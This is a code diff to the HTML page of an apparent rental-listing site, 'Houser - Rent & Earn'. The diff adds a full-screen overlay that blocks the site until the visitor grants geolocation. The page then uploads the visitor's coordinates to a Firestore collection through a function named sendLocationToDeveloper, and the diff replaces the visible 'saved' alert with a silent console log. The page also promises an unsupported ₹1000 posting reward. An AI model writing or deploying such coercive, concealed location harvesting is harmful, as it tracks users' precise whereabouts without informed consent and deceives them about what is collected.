@@ -25,7 +25,6 @@
     const db = getFirestore(app);
     const analytics = getAnalytics(app);
 
-    // Make Firestore functions available in window for other scripts
     window.db = db;
     window.addDoc = addDoc;
     window.collection = collection;
@@ -73,9 +72,29 @@
       font-size: 24px;
       cursor: pointer;
     }
+    #location-blocker {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+      text-align: center;
+      padding: 2rem;
+    }
   </style>
 </head>
 <body>
+
+  <!-- 🔒 Location permission blocker -->
+  <div id="location-blocker">
+    This site requires location access to continue.<br>
+    Please allow location permission when prompted.
+  </div>
 
   <header>
     Houser - Rent & Earn
@@ -83,7 +102,7 @@
   </header>
 
   <main id="house-list">
-    <p> Turn on location and open site again to Load nearby houses... </p>
+    <p>Loading nearby houses...</p>
   </main>
 
   <button id="post-btn" onclick="postHouse()">+</button>
@@ -92,7 +111,6 @@
   <script>
     let userLocation = null;
 
-    // Request location on load
     window.onload = () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -101,16 +119,24 @@
               lat: position.coords.latitude,
               lng: position.coords.longitude
             };
+
             console.log("User Location: ", userLocation);
+
+            // Remove blocker
+            document.getElementById("location-blocker").style.display = "none";
+
             fetchNearbyHouses(userLocation);
             sendLocationToDeveloper(userLocation);
           },
           error => {
-            alert("Location access is needed to show nearby houses.");
+            document.getElementById("location-blocker").innerHTML = `
+              ❗ Location permission is required to use this site.<br>
+              Please refresh the page and allow location access.`;
           }
         );
       } else {
-        alert("Geolocation is not supported by this browser.");
+        document.getElementById("location-blocker").innerHTML =
+          "❗ Geolocation is not supported by your browser.";
       }
     };
 
@@ -134,10 +160,8 @@
 
     function postHouse() {
       alert("Thank you for posting your house!\nYou earned ₹1000 reward.");
-      // Future: open a form to post rental info
     }
 
-    // ✅ Save location to Firestore
     function sendLocationToDeveloper(location) {
       console.log("Sending location data to developers:", location);
 
@@ -146,14 +170,13 @@
         lng: location.lng,
         timestamp: new Date()
       })
-        .then(() => {
-          alert("Location saved successfully to Firebase!");
-        })
-        .catch((error) => {
-          console.error("Error saving location:", error);
-        });
+      .then(() => {
+        console.log("Location saved to Firebase");
+      })
+      .catch((error) => {
+        console.error("Error saving location:", error);
+      });
     }
   </script>
-
 </body>
 </html>
